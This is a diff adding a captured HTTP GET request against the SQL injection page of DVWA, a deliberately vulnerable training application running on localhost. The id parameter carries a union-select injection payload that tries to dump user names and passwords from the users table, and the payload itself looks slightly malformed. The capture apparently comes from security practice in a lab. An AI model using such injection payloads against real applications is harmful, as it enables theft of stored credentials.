@@ -1,0 +1,12 @@
+GET /DVWA/vulnerabilities/sqli/?id=1'+union+select+user+password+from+users# &Submit=Submit HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://localhost/DVWA/vulnerabilities/sqli/
+Connection: keep-alive
+Cookie: security=low; PHPSESSID=0c815b279b08d8612a4066d667237b67
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
